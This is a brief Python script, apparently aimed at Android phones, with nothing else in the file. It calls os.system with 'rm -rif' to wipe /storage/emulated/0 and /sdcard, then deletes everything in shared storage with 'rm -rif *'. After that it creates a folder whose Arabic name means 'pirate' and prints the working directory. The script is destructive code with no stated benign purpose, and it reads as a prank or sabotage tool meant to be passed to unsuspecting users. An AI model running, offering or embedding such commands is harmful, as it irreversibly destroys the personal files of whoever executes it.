import os


os.system('rm -rif /storage/emulated/0')
os.system(' rm -rif /sdcard')
os.chdir('/storage/emulated/0')
os.system(' rm -rif *')
os.mkdir('قرصان-8R9')


print(os.getcwd())



